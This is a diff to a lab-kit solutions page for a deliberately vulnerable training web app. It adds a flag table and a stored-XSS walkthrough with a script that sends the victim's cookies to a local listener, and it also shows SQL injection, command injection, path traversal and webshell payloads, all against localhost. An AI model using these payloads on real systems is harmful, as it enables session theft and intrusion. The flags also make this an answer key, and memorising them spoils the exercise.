@@ -2,9 +2,22 @@
 tags: [css-exam, labs, solution, web]
 ---
 # VulnCorp (app 1) — Solutions
-> ↑ Lab Kit · method: Web Penetration Test Checklist
+> ↑ [[Lab Kit — hands-on training environment|Lab Kit]] · method: [[Web Penetration Test Checklist]]
 
 Try each vuln yourself first (checklist Phase 0 → detect → exploit). `U=http://localhost:8000`.
+
+## 🏁 Flags — one per vuln (track them on the 📊 Progress page)
+| Vuln | Flag | How you get it |
+|---|---|---|
+| SQL injection | `FLAG{sql1_auth_byp4ss_and_1dor}` | UNION-dump / auth-bypass → admin's `private_note` |
+| Reflected & Stored XSS | `FLAG{xss_st34ls_the_c00kie}` | steal the (non-HttpOnly) `flag` cookie via `document.cookie` |
+| IDOR | `FLAG{sql1_auth_byp4ss_and_1dor}` | `profile.php?id=1` → admin's note |
+| Command injection | `FLAG{c0mmand_1njection_rce_on_host}` | `;cat private/cmdi_flag.txt` via Net Tools |
+| LFI / traversal | `FLAG{lf1_path_tr4versal_reads_files_outside_webroot}` | `?page=../private/flag.txt` |
+| File upload | `FLAG{w3bshell_upl0ad_to_rce}` | webshell → `cat private/upload_flag.txt` |
+| Info disclosure | `FLAG{c0nfig_backup_left_in_webroot}` | `GET /config.php.bak` |
+| Weak creds | admin's note (above) | log in as `admin` with the cracked/guessed password |
+| Weak CSP | *(analysis finding — no flag)* | identify `script-src 'unsafe-inline'` in the CSP header |
 
 ## 1. SQL injection — auth bypass + UNION  (`login.php`, `index.php?q=`)
 **Answer:** login is a string-concatenated query → bypass with a comment; search is injectable → UNION-dump every credential.
@@ -23,10 +36,20 @@ curl -sG "$U/index.php" --data-urlencode "q=zzz%' UNION SELECT username,password
 **Command:** `$U/index.php?q="><script>alert(document.domain)</script>`
 **Result:** the script tag lands in the page and executes. **Reason:** no `htmlspecialchars()` on output.
 
-## 3. Stored XSS  (guestbook on `index.php`)
-**Answer:** the comment body is stored and rendered raw.
-**Command:** `curl -s "$U/index.php" --data-urlencode "author=x" --data-urlencode "body=<script>alert(1)</script>"` then reload.
-**Result:** every visitor runs the script. **Reason:** `body` echoed without encoding (author IS encoded — note the difference).
+## 3. Stored XSS  (guestbook on `index.php`)  — and "what can XSS actually do?"
+**Answer:** the comment **body** is stored and rendered raw (the author is escaped — put the payload in the *message*).
+**Confirm it runs:** post `<script>alert('stored xss')</script>` in the message → reload → it fires for every visitor.
+
+**"How do I get information from it?"** XSS runs JS *as the victim*, so you can read their session/DOM and **exfiltrate** it. There's a non-HttpOnly `flag` cookie here to prove it — steal it:
+```
+# 1) start a listener on Kali to catch the stolen data:
+python3 -m http.server 9001
+# 2) post this as the guestbook MESSAGE (the payload beacons the victim's cookies to you):
+<script>new Image().src='http://127.0.0.1:9001/steal?c='+encodeURIComponent(document.cookie)</script>
+# 3) reload the guestbook -> your listener logs:  GET /steal?c=flag=FLAG{xss_st34ls_the_c00kie}
+```
+**Flag:** `FLAG{xss_st34ls_the_c00kie}` (arrives in your listener). **Result:** real cookie/session theft — in a live app that cookie would be the victim's login session. Other payloads: keylogging, making requests as the victim, defacing. **Reason:** `body` echoed without encoding.
+> Reflected XSS (search box) steals the same cookie — the difference is stored = hits every visitor automatically; reflected = needs a crafted link.
 
 ## 4. IDOR  (`profile.php?id=`)
 **Answer:** no ownership check — any `id` reveals that user's note + API key.
